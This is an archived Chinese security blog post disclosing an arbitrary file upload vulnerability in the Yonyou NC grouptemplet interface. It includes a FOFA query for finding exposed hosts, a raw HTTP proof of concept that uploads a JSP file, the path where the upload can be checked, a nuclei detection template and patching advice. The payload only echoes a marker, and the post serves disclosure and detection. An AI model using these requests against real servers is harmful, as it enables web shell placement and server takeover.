---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  用友NC grouptemplet 任意文件上传漏洞   
原创 fgz  AI与网安   2024-04-29 07:00  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
****  
**次条通常是广告，内容我也没验证，感兴趣的自行验证，不感兴趣的忽略。**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
用友NC grouptemplet 任意文件上传漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
用友NC 版本不详  
  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC grouptemplet接口处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
icon_hash="1085941792"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOqZXohpWdOwticawLfzcmBeOIWJzicQSA1Ul4XjJ13ur72JJlSHMTKNW6Z0rIGDYQiaicDV5LDIvaB2Q/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
POC  
```
POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Connection: close
Content-Length: 268
Content-type: multipart/form-data; boundary=----------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk
Accept-Encoding: gzip

------------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk
Content-Disposition: form-data; name="upload"; filename="2fiu0YTGkaX2DrJlUZZP5IGvNvk.jsp"
Content-Type: application/octet-stream

<%out.println("2fiu0WM4788fa6NcMHipkIthTTW");%>
------------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk--
```  
  
回显路径  
```
/uapim/static/pages/nc/head.jsp
```  
  
  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: yonyou-nc-grouptemplet-fileupload

info:
  name: 用友NC grouptemplet 任意文件上传漏洞
  author: fgz
  severity: critical
  description: |
    用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC grouptemplet接口处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。
  reference:
    none
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="1085941792"
  tags: yonyou,nc,fileupload,2024

variables:
  boundary: '{{rand_base(29)}}'

http:
  - raw:
      - |
        POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
        Content-type: multipart/form-data; boundary=----------{{boundary}}
        
        ------------{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
        Content-Type: application/octet-stream
        
        <%out.println("{{randstr_2}}");%>
        ------------{{boundary}}--

      - |
        GET /uapim/static/pages/nc/head.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
        condition: and
```  
  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
用友安全中心补丁连接  
```
https://security.yonyou.com/#/patchList
```  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
